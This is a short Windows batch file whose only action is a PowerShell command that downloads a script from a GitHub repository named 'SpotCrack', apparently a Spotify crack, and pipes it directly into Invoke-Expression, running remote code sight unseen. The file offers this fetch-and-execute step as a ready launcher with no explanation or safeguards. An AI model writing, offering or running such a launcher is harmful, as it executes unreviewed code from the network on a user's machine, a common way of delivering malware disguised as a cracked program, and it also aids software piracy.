@echo off
powershell -Command "& {Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/InkyScud/SpotCrack/main/SpotCrack' | Invoke-Expression}"
pause
exit
